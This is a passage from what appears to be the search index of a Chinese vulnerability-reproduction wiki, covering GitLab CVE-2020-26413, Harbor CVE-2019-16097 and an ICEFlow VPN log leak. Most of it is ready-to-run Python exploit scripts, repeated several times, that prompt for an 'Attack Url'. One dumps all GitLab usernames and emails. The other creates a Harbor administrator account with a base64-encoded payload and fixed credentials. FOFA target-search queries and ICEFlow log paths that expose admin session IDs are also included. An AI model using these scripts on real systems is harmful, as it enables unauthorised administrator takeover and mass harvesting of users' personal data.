InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: GitLab 13.4 - 13.6.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/api/graphql\" user_number = 0 headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/json\" , } try : data = \"\"\" {\"query\":\"{ \\\\ nusers { \\\\ nedges { \\\\ n node { \\\\ n username \\\\ n email \\\\ n avatarUrl \\\\ n status { \\\\ n emoji \\\\ n message \\\\ n messageHtml \\\\ n } \\\\ n } \\\\ n } \\\\ n } \\\\ n }\",\"variables\":null,\"operationName\":null} \"\"\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"email\" in response . text and \"username\" in response . text and \"@\" in response . text and response . status_code == 200 : print ( ' \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u6cc4\u9732\u7528\u6237\u90ae\u7bb1\u6570\u636e....... \\033 [0m' . format ( target_url )) for i in range ( 0 , 999 ): try : username = json . loads ( response . text )[ \"data\" ][ \"users\" ][ \"edges\" ][ i ][ \"node\" ][ \"username\" ] email = json . loads ( response . text )[ \"data\" ][ \"users\" ][ \"edges\" ][ i ][ \"node\" ][ \"email\" ] user_number = user_number + 1 print ( ' \\033 [34m[o] \u7528\u6237\u540d: {} \u90ae\u7bb1: {} \\033 [0m' . format ( username , email )) except : print ( \" \\033 [32m[o] \u5171\u6cc4\u9732 {} \u540d\u7528\u6237\u90ae\u7bb1\u8d26\u53f7 \\033 [0m\" . format ( user_number )) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d GitLab_Graphql_Email_information_disclosure.json","title":"GitLab Graphql\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-26413"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#gitlab-graphql\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e-cve-2020-26413","text":"","title":"GitLab Graphql\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-26413"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#\u6f0f\u6d1e\u63cf\u8ff0","text":"GitLab\u4e2d\u5b58\u5728Graphql\u63a5\u53e3 \u8f93\u5165\u6784\u9020\u7684\u6570\u636e\u65f6\u4f1a\u6cc4\u9732\u7528\u6237\u90ae\u7bb1\u548c\u7528\u6237\u540d","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] GitLab 13.4 - 13.6.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#fofa","text":"[!NOTE] title=\"GitLab\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u6765\u6e90\u4e3a hackone\u4e0a\u7684\u4e00\u7bc7\u516c\u5f00\u62a5\u544a https://gitlab.com/gitlab-org/gitlab/-/issues/244275 \u610f\u601d\u4e3a\u5f53\u4f7f\u7528\u6784\u9020\u7684\u8bed\u53e5\u5728\u63a5\u53e3\u67e5\u8be2\u65f6\u4f1a\u8fd4\u56de\u90ae\u7bb1\u4fe1\u606f\uff0c\u5982\u56fe \u8bbf\u95ee URL http://xxx.xxx.xxx.xxx/-//graphql-explorer Gitlab\u672c\u8eab\u4e0d\u5141\u8bb8\u83b7\u53d6\u8d26\u53f7\u90ae\u7bb1\u4fe1\u606f\uff0c\u8fd9\u91cc\u901a\u8fc7\u8c03\u7528 Graphql \u7528\u6237\u540d\u67e5\u8be2\u9020\u6210\u4e86\u90ae\u7bb1\u6cc4\u9732\u6f0f\u6d1e \u67e5\u770b\u5b8c\u62a5\u544a\u540e\u53d1\u73b0\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u6709\u8d26\u53f7\u7528\u6237\u540d\uff0c\u5728\u4e0d\u77e5\u9053\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u83b7\u53d6\u90ae\u7bb1\uff0c\u5728 Graphql\u5b98\u7f51 \u67e5\u770b\u5f97\u77e5\u53ef\u4ee5\u901a\u8fc7\u53e6\u4e00\u4e2a\u6784\u9020\u7684\u8bed\u53e5\u4e00\u6b21\u6027\u8fd4\u56de\u6240\u6709\u7684\u7528\u6237\u540d\u548c\u90ae\u7bb1 \u53d1\u5305\u8c03\u7528\u4e86 /api/graphql \u63a5\u53e3\u53d1\u9001\u6570\u636e \u5b8c\u6574\u6570\u636e\u5305\u4e3a POST /api/graphql HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx Co ntent - Le n g t h : 212 Co ntent - Type : applica t io n /jso n { \"query\" : \"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\" , \"variables\" : null , \"operationName\" : null } \u6210\u529f\u8fd4\u56de\u6570\u636e\uff0c\u9020\u6210 Gitlab\u7684\u7528\u6237\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: GitLab 13.4 - 13.6.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/api/graphql\" user_number = 0 headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/json\" , } try : data = \"\"\" {\"query\":\"{ \\\\ nusers { \\\\ nedges { \\\\ n node { \\\\ n username \\\\ n email \\\\ n avatarUrl \\\\ n status { \\\\ n emoji \\\\ n message \\\\ n messageHtml \\\\ n } \\\\ n } \\\\ n } \\\\ n } \\\\ n }\",\"variables\":null,\"operationName\":null} \"\"\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"email\" in response . text and \"username\" in response . text and \"@\" in response . text and response . status_code == 200 : print ( ' \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u6cc4\u9732\u7528\u6237\u90ae\u7bb1\u6570\u636e....... \\033 [0m' . format ( target_url )) for i in range ( 0 , 999 ): try : username = json . loads ( response . text )[ \"data\" ][ \"users\" ][ \"edges\" ][ i ][ \"node\" ][ \"username\" ] email = json . loads ( response . text )[ \"data\" ][ \"users\" ][ \"edges\" ][ i ][ \"node\" ][ \"email\" ] user_number = user_number + 1 print ( ' \\033 [34m[o] \u7528\u6237\u540d: {} \u90ae\u7bb1: {} \\033 [0m' . format ( username , email )) except : print ( \" \\033 [32m[o] \u5171\u6cc4\u9732 {} \u540d\u7528\u6237\u90ae\u7bb1\u8d26\u53f7 \\033 [0m\" . format ( user_number )) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d GitLab_Graphql_Email_information_disclosure.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/","text":"Harbor \u672a\u6388\u6743\u521b\u5efa\u7ba1\u7406\u5458\u6f0f\u6d1e CVE-2019-16097 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u8fd1\u65e5\uff0c\u955c\u50cf\u4ed3\u5e93Harbor\u7206\u51fa\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u8bf7\u6c42\u4e2d\u6784\u9020\u7279\u5b9a\u5b57\u7b26\u4e32\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002\u6211\u4eec\u5f97\u5230\u6d88\u606f\uff0c\u7b2c\u4e00\u65f6\u95f4\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u4e86\u9a8c\u8bc1\uff0c\u5b98\u65b9\u5df2\u53d1\u5e03\u516c\u544a\u8bf4\u660e\uff0c\u6700\u65b0\u76841.7.6\u548c1.8.3\u5df2\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u8bf7\u4f7f\u7528\u5230\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\u3002 Harbor\u662f\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8\u548c\u5206\u53d1Docker\u955c\u50cf\u7684\u4f01\u4e1a\u7ea7Registry\u670d\u52a1\u5668\u3002Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c\u4e2d\u7684core/api/user.go\u6587\u4ef6\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u901a\u8fc7\u5728\u8bf7\u6c42\u4e2d\u6dfb\u52a0\u5173\u952e\u53c2\u6570\uff0c\u5373\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c FOFA \u00b6 [!NOTE] title=\"Harbor\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u5411**/api/user** \u63a5\u53e3\u53d1\u9001\u521b\u5efa\u7528\u6237\u7684\u8bf7\u6c42, \u72b6\u6001\u7801\u8fd4\u56de201\u5373\u521b\u5efa\u6210\u529f \u4f7f\u7528\u521b\u5efa\u7684\u8d26\u6237\u6210\u529f\u767b\u5f55\u540e\u53f0 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Harbor 1.7.0\u81f31.8.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/api/users\" data = base64 . b64decode ( \"eyJ1c2VybmFtZSI6IlBlaVFpIiwiZW1haWwiOiJQZWlRaUBxcS5jb20iLCJyZWFsbmFtZSI6IlBlaVFpIiwicGFzc3dvcmQiOiJQZWlRaVBlaVFpIiwiY29tbWVudCI6IjEiLCJoYXNfYWRtaW5fcm9sZSI6dHJ1ZX0=\" ) headers = { \"Content-Type\" : \"application/json\" , \"Accept\" : \"application/json\" } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /api/users..... \\033 [0m\" . format ( target_url )) if response . status_code == 201 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u521b\u5efa\u8d26\u53f7:PeiQi \u5bc6\u7801:PeiQiPeiQi \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"Harbor \u672a\u6388\u6743\u521b\u5efa\u7ba1\u7406\u5458\u6f0f\u6d1e CVE-2019-16097"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/#harbor-\u672a\u6388\u6743\u521b\u5efa\u7ba1\u7406\u5458\u6f0f\u6d1e-cve-2019-16097","text":"","title":"Harbor \u672a\u6388\u6743\u521b\u5efa\u7ba1\u7406\u5458\u6f0f\u6d1e CVE-2019-16097"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u8fd1\u65e5\uff0c\u955c\u50cf\u4ed3\u5e93Harbor\u7206\u51fa\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u8bf7\u6c42\u4e2d\u6784\u9020\u7279\u5b9a\u5b57\u7b26\u4e32\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002\u6211\u4eec\u5f97\u5230\u6d88\u606f\uff0c\u7b2c\u4e00\u65f6\u95f4\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u4e86\u9a8c\u8bc1\uff0c\u5b98\u65b9\u5df2\u53d1\u5e03\u516c\u544a\u8bf4\u660e\uff0c\u6700\u65b0\u76841.7.6\u548c1.8.3\u5df2\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u8bf7\u4f7f\u7528\u5230\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\u3002 Harbor\u662f\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8\u548c\u5206\u53d1Docker\u955c\u50cf\u7684\u4f01\u4e1a\u7ea7Registry\u670d\u52a1\u5668\u3002Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c\u4e2d\u7684core/api/user.go\u6587\u4ef6\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u901a\u8fc7\u5728\u8bf7\u6c42\u4e2d\u6dfb\u52a0\u5173\u952e\u53c2\u6570\uff0c\u5373\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/#fofa","text":"[!NOTE] title=\"Harbor\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u5411**/api/user** \u63a5\u53e3\u53d1\u9001\u521b\u5efa\u7528\u6237\u7684\u8bf7\u6c42, \u72b6\u6001\u7801\u8fd4\u56de201\u5373\u521b\u5efa\u6210\u529f \u4f7f\u7528\u521b\u5efa\u7684\u8d26\u6237\u6210\u529f\u767b\u5f55\u540e\u53f0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Harbor/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E%20CVE-2019-16097/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Harbor 1.7.0\u81f31.8.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/api/users\" data = base64 . b64decode ( \"eyJ1c2VybmFtZSI6IlBlaVFpIiwiZW1haWwiOiJQZWlRaUBxcS5jb20iLCJyZWFsbmFtZSI6IlBlaVFpIiwicGFzc3dvcmQiOiJQZWlRaVBlaVFpIiwiY29tbWVudCI6IjEiLCJoYXNfYWRtaW5fcm9sZSI6dHJ1ZX0=\" ) headers = { \"Content-Type\" : \"application/json\" , \"Accept\" : \"application/json\" } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /api/users..... \\033 [0m\" . format ( target_url )) if response . status_code == 201 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u521b\u5efa\u8d26\u53f7:PeiQi \u5bc6\u7801:PeiQiPeiQi \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"ICEFlow VPN \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 ICEFlow VPN \u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u770b\u65e5\u5fd7\u4e2d\u7684\u654f\u611f\u6570\u636e\u6765\u8fdb\u4e00\u6b65\u653b\u51fb\u7cfb\u7edf \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] ICEFlow VPN FOFA \u00b6 [!NOTE] title=\"ICEFLOW VPN Router\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u53ef\u8bbf\u95ee\u7684\u65e5\u5fd7 Url \u7cfb\u7edf\u65e5\u5fd7 http://url/log/system.log VPN\u65e5\u5fd7 http://url/log/vpn.log \u8bbf\u95ee\u65e5\u5fd7 http://url/log/access.log \u544a\u8b66\u65e5\u5fd7 http://url/log/warn.log \u9519\u8bef\u65e5\u5fd7 http://url/log/error.log \u8c03\u8bd5\u65e5\u5fd7 http://url/log1/debug.log \u79fb\u52a8\u7528\u6237\u65e5\u5fd7 http://url/log/mobile.log \u9632\u706b\u5899\u65e5\u5fd7 http://url/log/firewall.log \u6839\u636e\u65e5\u5fd7\u4fe1\u606f\u83b7\u5f97session\u540e\uff0c\u53ef\u5229\u7528\u5b9e\u65f6\u767b\u5f55\u7cfb\u7edf\u7ba1\u7406\u540e\u53f0\uff1a http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0 Goby & POC \u00b6 [!NOTE] ICEFlow VPN \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u53c2\u8003\u6587\u7ae0 \u00b6 https://www.uedbox.com/post/18720/","title":"ICEFlow VPN \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#iceflow-vpn-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"ICEFlow VPN \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"ICEFlow VPN \u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u770b\u65e5\u5fd7\u4e2d\u7684\u654f\u611f\u6570\u636e\u6765\u8fdb\u4e00\u6b65\u653b\u51fb\u7cfb\u7edf","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] ICEFlow VPN","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"ICEFLOW VPN Router\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u53ef\u8bbf\u95ee\u7684\u65e5\u5fd7 Url \u7cfb\u7edf\u65e5\u5fd7 